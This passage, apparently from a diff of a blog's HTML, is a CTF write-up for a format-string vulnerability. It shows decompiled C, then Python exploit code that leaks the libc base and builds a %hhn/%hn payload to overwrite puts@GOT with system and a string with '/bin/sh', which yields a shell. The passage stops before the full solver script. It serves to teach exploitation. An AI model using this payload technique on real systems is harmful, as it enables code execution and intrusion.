+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Oh no! We spilled oil everywhere and its making everything dirty&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;do you have any ideas of what we can use to clean it?&#34;</span>);
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>  fgets(local_148,<span style="color:#f60">300</span>,stdin);
+</span></span><span style="display:flex;"><span>  printf(local_148);
+</span></span><span style="display:flex;"><span>  puts(x);
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    __stack_chk_fail();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we look at the code, seems like the code already leaked the libc of <code>puts</code> and <code>printf</code>. Another thing that we could notice is, there is a format string bug in below code</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  fgets(local_148,<span style="color:#f60">300</span>,stdin);
+</span></span><span style="display:flex;"><span>  printf(local_148);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Also another thing to look is the <code>puts(x)</code> line. Checking on Ghidra,<code>x</code> is a string located in <code>.data</code>
+<p class="markdown-image">
+  <img src="https://i.imgur.com/bwFIgcU.png" alt=""  />
+</p></p>
+<p>Looking at the given <code>Dockerfile</code>, we can simply build it, and then take the <code>libc</code> file of the binary.</p>
+<h4 id="exploitation-plan-2">Exploitation Plan <a href="#exploitation-plan-2" class="anchor">#</a></h4>
+<p>Based on the initial analysis, what we already have are:</p>
+<ul>
+<li>Libc file (from <code>Dockerfile</code>)</li>
+<li>Libc base during the binary execution (Due to the leak)</li>
+<li>Format string bug</li>
+</ul>
+<p>Note that we can overwrite value with format string bug via <code>%n</code>. For example, if we do <code>%20$n</code>, then it will overwrite the 20th element with how many characters have we printed.</p>
+<p>Based on those, my plan is to overwrite the <code>puts</code> to <code>system</code>, and <code>x</code> to <code>/bin/sh\x00</code>. So that after reading our payload, when the binary call <code>puts(x)</code>, they will call <code>system('/bin/sh\x00')</code> instead.</p>
+<h4 id="solution-2">Solution <a href="#solution-2" class="anchor">#</a></h4>
+<p>So, in order to execute the plan, what I do is:</p>
+<ul>
+<li>Overwrite <code>x</code> value byte per byte (via <code>%hhn</code>)</li>
+<li>Overwrite <code>puts</code> last byte (via <code>%hhn</code>)</li>
+<li>Overwrite <code>puts</code> second and third last byte (via <code>%hn</code>)</li>
+</ul>
+<p>First, let&rsquo;s try to get the libc base from the leaked:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
+</span></span><span style="display:flex;"><span>outs <span style="color:#555">=</span> r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()<span style="color:#555">.</span>split(<span style="color:#c30">b</span><span style="color:#c30">&#39;,&#39;</span>)
+</span></span><span style="display:flex;"><span>leaked_puts <span style="color:#555">=</span> <span style="color:#366">int</span>(outs[<span style="color:#f60">0</span>], <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#555">=</span> leaked_puts <span style="color:#555">-</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>libc<span style="color:#555">.</span>address <span style="color:#555">=</span> libc_base
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leaked Libc base: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc_base)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;system@libc: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(system_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#555">=</span> exe<span style="color:#555">.</span>got[<span style="color:#c30">&#34;puts&#34;</span>] <span style="color:#09f;font-style:italic"># This will be overwritten with system</span>
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;puts@got  : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(puts_got)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>x_addr <span style="color:#555">=</span> exe<span style="color:#555">.</span>symbols[<span style="color:#c30">&#34;x&#34;</span>] <span style="color:#09f;font-style:italic"># This will be overwritten with /bin/sh\x00</span>
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;x         : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(x_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After executing the above codes, we will already have:</p>
+<ul>
+<li>The <code>puts</code> got location</li>
+<li>The <code>x</code> location</li>
+<li>The <code>system</code> address in <code>libc</code></li>
+</ul>
+<p>Now, let&rsquo;s craft our payload. Below is the payload that I use</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fmt_str <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%21$hhn&#39;</span><span style="color:#555">.</span>encode() <span style="color:#09f;font-style:italic"># Overwrite lsb of x to \x00</span>
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x20</span><span style="color:#a00">}</span><span style="color:#c30">c%22$hhn&#39;</span><span style="color:#555">.</span>encode() <span style="color:#09f;font-style:italic"># Overwrite lsb of puts to lsb of system</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite x to &#39;/bin/sh&#39;</span>
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x2f</span><span style="color:#555">-</span><span style="color:#f60">0x20</span><span style="color:#a00">}</span><span style="color:#c30">c%23$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%24$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x62</span><span style="color:#555">-</span><span style="color:#f60">0x2f</span><span style="color:#a00">}</span><span style="color:#c30">c%25$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x68</span><span style="color:#555">-</span><span style="color:#f60">0x62</span><span style="color:#a00">}</span><span style="color:#c30">c%26$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x69</span><span style="color:#555">-</span><span style="color:#f60">0x68</span><span style="color:#a00">}</span><span style="color:#c30">c%27$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x6e</span><span style="color:#555">-</span><span style="color:#f60">0x69</span><span style="color:#a00">}</span><span style="color:#c30">c%28$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x73</span><span style="color:#555">-</span><span style="color:#f60">0x6e</span><span style="color:#a00">}</span><span style="color:#c30">c%29$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite 2nd and 3rd byte of puts to system</span>
+</span></span><span style="display:flex;"><span>second_third_byte_system <span style="color:#555">=</span> u64(p64(system_addr)[<span style="color:#f60">1</span>:<span style="color:#f60">3</span>]<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>))
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span>second_third_byte_system<span style="color:#555">-</span><span style="color:#f60">0x73</span><span style="color:#a00">}</span><span style="color:#c30">c%30$hn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">=</span> pad(fmt_str, <span style="color:#f60">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># This will be used as the address that we will overwrite</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># For x_addr, we will overwrite it per byte</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># For puts, we will:</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Overwrite the last byte first (0x20)</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Overwrite the second and third byte together</span>
+</span></span><span style="display:flex;"><span>addr <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>addr <span style="color:#555">+=</span> p64(x_addr<span style="color:#555">+</span><span style="color:#f60">7</span>) <span style="color:#555">+</span> p64(puts_got) <span style="color:#555">+</span> p64(x_addr)
+</span></span><span style="display:flex;"><span>addr <span style="color:#555">+=</span> p64(x_addr<span style="color:#555">+</span><span style="color:#f60">4</span>) <span style="color:#555">+</span> p64(x_addr<span style="color:#555">+</span><span style="color:#f60">1</span>) <span style="color:#555">+</span> p64(x_addr <span style="color:#555">+</span> <span style="color:#f60">6</span>)
+</span></span><span style="display:flex;"><span>addr <span style="color:#555">+=</span> p64(x_addr <span style="color:#555">+</span> <span style="color:#f60">2</span>) <span style="color:#555">+</span> p64(x_addr <span style="color:#555">+</span> <span style="color:#f60">3</span>) <span style="color:#555">+</span> p64(x_addr <span style="color:#555">+</span> <span style="color:#f60">5</span>)
+</span></span><span style="display:flex;"><span>addr <span style="color:#555">+=</span> p64(puts_got<span style="color:#555">+</span><span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> fmt_str <span style="color:#555">+</span> addr
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, <code>%hhn</code> will overwrite <strong>1 byte</strong> of the targeted element with the total character that we have printed, <code>%hn</code> will overwrite <strong>2 bytes</strong> of the targeted element, and <code>%c</code> will print space with total as the given number (For example, <code>%100c</code> will print 100 spaces). And <code>%10c%5$n</code> means we overwrite the fifth element with 0xA (10).</p>
+<p>Notes that we actually need to carefully craft our payload to make sure the payload is ordered by the byte, because any character that we print to overwrite the current element, will be counted also during overwritten the next element. For example, if we already print 0x20, and then we want to overwrite another element, we can only overwrite it with size larger than 0x20. Let say we want to overwrite it with 0x2f, then we only need to print 0xf more.</p>
+<p>This means that we need to sort our payload to overwrite the address sorted by the byte from the smallest to the largest, because we can&rsquo;t decrease the total count of the characters that we have printed. The above payload already fulfilled this increasing condition.</p>
+<p>Below is the result after we send the crafted payload to the server. We got a shell and we can read the flag
+<p class="markdown-image">
+  <img src="https://i.imgur.com/FjtlnXi.png" alt=""  />
+</p></p>
+<p>This is the full solver script</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
